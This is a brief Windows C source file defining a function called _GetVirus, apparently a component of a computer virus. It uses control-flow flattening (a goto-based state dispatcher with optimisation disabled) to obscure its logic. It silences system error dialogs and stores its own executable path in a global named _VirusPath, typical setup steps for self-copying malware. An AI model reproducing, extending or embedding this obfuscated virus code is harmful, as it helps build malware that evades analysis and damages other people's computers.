#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>

void _GetVirus(void)
{
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 0) goto end;

block1:
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    PeekMessageA(NULL, NULL, 0, 0, PM_NOREMOVE);
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    GetModuleFileNameA(NULL, _VirusPath, 260);
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
